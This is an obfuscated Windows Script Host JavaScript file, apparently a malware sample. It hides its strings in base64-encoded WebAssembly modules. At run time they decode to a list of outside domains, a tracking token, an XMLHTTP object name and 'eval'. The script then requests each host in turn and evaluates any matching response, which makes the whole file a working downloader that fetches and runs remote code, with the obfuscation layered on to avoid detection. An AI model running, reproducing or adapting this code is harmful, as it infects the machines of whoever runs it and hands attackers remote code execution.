const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGwoCAgAALfwBBAQt/AEH+AAt/AEGEAQt/AEH+AQt/AEGOAgt/AEGUAgt/AEGaAgt/AEGgAgt/AEGsAgt/AEG8Agt/AEHAAgsH44CAgAAMBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoL9YKAgAALAEEBC3tkZWx0YS50cnVlY29tcGFzc2Rlc2lnbnMubmV0JTIwbGl2ZTJsaXZlLm1lJTIwb25saW5lLXdlYi10eXBpbmcuY29tJTIwaXJtYS50cnVlY29tcGFzc2Rlc2lnbnMubmV0JTIwb21lZ2FtaW5pc3RyeWdyb3VwLmNvbQAAQf4ACwQlMjAAAEGEAQt5MDAwMDAwMUJiYmFVbm5ZU25IUUI1eVpRRFoxNGQ5bTVyRTI0YmV5N3JYQjRhT3lwZktJVllFbGdDSTBmbmRtOUJXX3ZSMDNoLVBGejEwaHJIVlVfWl85NUprZU5MSW5ESmR0VWVESDhfX0ZuZDhSOFdLZGxkaEJsAABB/gELD01TWE1MMi5YTUxIVFRQAABBjgILBCUyRgAAQZQCCwRHRVQAAEGaAgsFaHR0cAAAQaACCwolM0ElMkYlMkYAAEGsAgsOY291bnRlciUyRiUzRgAAQbwCCwJhAABBwAILBWV2YWwA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var x = lS(0, 0).split(lS(0, 1));
var m = lS(0, 2);
for (var i = 0; i < x.length; i++) {
    var e = WScript.CreateObject(lS(0, 3));
    try {
        var ter = lS(0, 4);
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.open(lS(0, 5), lS(0, 6) + lS(0, 7) + x[i] + ter + lS(0, 8) + m, false);
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.send();
                    }
                }
            });
            const __exports = __callInstance0.exports;
            return __exports.data();
        })();
        var r = e.responseText;
        if (r.length > 1000 && r.indexOf(m) > -1) {
            window[lS(0, 10, true)](e.responseText.split(m).join(lS(0, 9)));
            break;
        }
        ;
    } catch (e) {
    }
    ;
}
;